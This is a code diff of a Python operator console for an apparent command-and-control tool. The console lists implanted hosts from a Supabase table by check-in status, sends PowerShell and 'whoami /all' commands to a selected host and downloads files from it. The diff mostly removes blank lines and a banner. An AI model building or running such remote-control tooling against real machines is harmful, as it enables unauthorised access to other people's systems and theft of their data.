@@ -23,21 +23,19 @@ RESET = '\033[0m'
 command_mappings = {
     "psls": "powershell ls",
     "ps": "powershell get-process",
-    "pwd": "powershell pwd",
+    "pspwd": "powershell pwd",
     "whoami": "whoami /all",
     # ... add more mappings as needed
 }
 
-# Default sleep interval and check-in threshold (moved from send_command_and_get_output)
+# Default sleep interval and check-in threshold
 current_sleep_interval = 5
 CHECK_IN_THRESHOLD = timedelta(minutes=10)
 
 def select_hostname():
-    """Select a hostname based on check-in status."""
     response = supabase.table('settings').select('hostname', 'last_checked_in').execute()
     hosts = response.data
     now = datetime.utcnow()
-
     if not hosts:
         print("No hosts found in the settings table.")
         return None
@@ -57,7 +55,6 @@ def select_hostname():
         else:
             color = RED
             status = "likely dead"
-
         print(f"{index}. {color}{host['hostname']} ({status}){RESET}")
 
     try:
@@ -66,39 +63,25 @@ def select_hostname():
     except (ValueError, IndexError):
         print("Invalid selection.")
         return None
-
     return selected_host
 
-
 def main():
-
-    print("\n░▒▓███████▓▒░ ░▒▓██████▓▒░ ░▒▓██████▓▒░        ░▒▓██████▓▒░░▒▓███████▓▒░")
-    print("░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░")
-    print("░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░             ░▒▓█▓▒░")
-    print("░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░      ░▒▓█▓▒░       ░▒▓██████▓▒░")
-    print("░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░")
-    print("░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░")
-    print("░▒▓███████▓▒░ ░▒▓██████▓▒░░▒▓█▓▒░░▒▓█▓▒░       ░▒▓██████▓▒░░▒▓████████▓▒░\n")
-    print("byte the shit out you - written completely by chatgpt and gemini\n")
     username = login.login()
     if username is None:
         return
 
     hostname = select_hostname()
-
     while hostname:
         print(f"\nInteracting with '{GREEN}{hostname}{RESET}' with user '{username}'\n")
         print("1. Interact")
         print("2. Exit to Host Selection")
         print("3. Exit to Local Terminal")
         print("4. List Downloads")
-
         try:
             choice = int(input("\nEnter your choice: "))
         except ValueError:
             print("Invalid choice. Please enter a number.")
             continue
-
         if choice == 1:
             send_command_and_get_output(hostname, username, command_mappings, current_sleep_interval)
         elif choice == 2:
@@ -109,7 +92,6 @@ def main():
             list_and_download_files(hostname)
         else:
             print("Invalid choice. Please try again.")
-
 
 if __name__ == "__main__":
     main()
